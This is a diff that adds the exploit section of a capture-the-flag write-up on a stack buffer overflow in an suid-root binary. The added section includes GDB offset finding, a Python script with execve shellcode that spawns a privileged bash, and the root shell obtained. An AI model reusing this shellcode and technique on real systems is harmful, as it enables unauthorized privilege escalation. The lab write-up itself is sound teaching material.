@@ -1,7 +1,5 @@
 # Buffer overflow PrivEsc
 
-# Buffer overflow PrivEsc
-
 ## Information gathering
 
 For the this last writeup, we now have access to zaz's home. And inside that, we find that there is in an executable there called `exploit_me` with an suid on user and group. And interesting ! It belongs to root and I'm the zaz group.
@@ -87,3 +85,86 @@ TLDR :
 - And enjoy the root
 
 ## The exploit
+
+In order to find the offset of the stack of return pointer adresses, we'll use GDB because it's installed on the victim's machine and we'll throw things until we see what sticks.
+
+And we throw at it, 143 characters and yep what we're trying to overwrite is right after our buffer.
+```text
+(gdb) run $(python -c "print('a'*143)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/zaz/exploit_me $(python -c "print('a'*143)")
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00616161 in ?? ()
+(gdb) bt
+#0  0x00616161 in ?? ()
+#1  0x00000002 in ?? ()
+#2  0xbffff764 in ?? ()
+Backtrace stopped: previous frame inner to this frame (corrupt stack?)
+```
+
+So our payload easy peasy, it shoud look like this :
+```text
+SHELLCODE + PADDING + ADDRESS OF THE BUFFER
+```
+
+This script contains generates our payload which will be stored in a `payload` file :
+
+```py
+addr = b"\xbf\xff\xf8\x98"[::-1]
+shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+payload = shellcode + (140 - len(shellcode)) * b"\x90" + addr
+with open("payload", "wb") as f :
+    f.write(payload)
+```
+
+And we'll be able to exploit it by running the script like this :
+```text
+./exploit_me $(cat payload)
+```
+
+It won't work yet because the address of our buffer is not known but we can know it by simply throwing our payload at it (with an incorrect address) with ltrace.
+
+It gives us this output :
+```text
+zaz@BornToSecHackMe:~$ python exploit.py 
+zaz@BornToSecHackMe:~$ ./exploit_me^C
+zaz@BornToSecHackMe:~$ ltrace ./exploit_me $(cat payload)
+__libc_start_main(0x80483f4, 2, 0xbffff774, 0x8048440, 0x80484b0 <unfinished ...>
+strcpy(0xbffff650, "j\013X\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315"...)          = 0xbffff650
+puts("j\013X\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315"...j
+                                                                      X�Rfh-p��Rjhh/bash/bin��RQS��̀���������������������������������������������������������������������������������������������������������������
+)                        = 145
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+zaz@BornToSecHackMe:~$ 
+```
+
+And from this, we know that, the destination argument (the buffer) of the call to strcpy is 0xbffff650.
+
+And badabim badaboum, we modify the addr variable accordingly.
+```py
+addr = b"\xbf\xff\xf6\x50"[::-1]
+```
+
+And when we retry :
+```text
+zaz@BornToSecHackMe:~$ ./exploit_me $(cat payload)
+j
+ X�Rfh-p��Rjhh/bash/bin��RQS��̀�����������������������������������������������������������������������������������������������������������P���
+bash-4.2# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+bash-4.2#
+````
+
+And voila ! We now can go to root's home and we find a README congratulating us.
+```text
+bash-4.2# cat README
+CONGRATULATIONS !!!!
+To be continued...
+bash-4.2# 
+```
+
+![](https://static.wikia.nocookie.net/thesims4memehouse/images/b/b7/Bogan_Default_Dance.gif/revision/latest?cb=20210304203924)
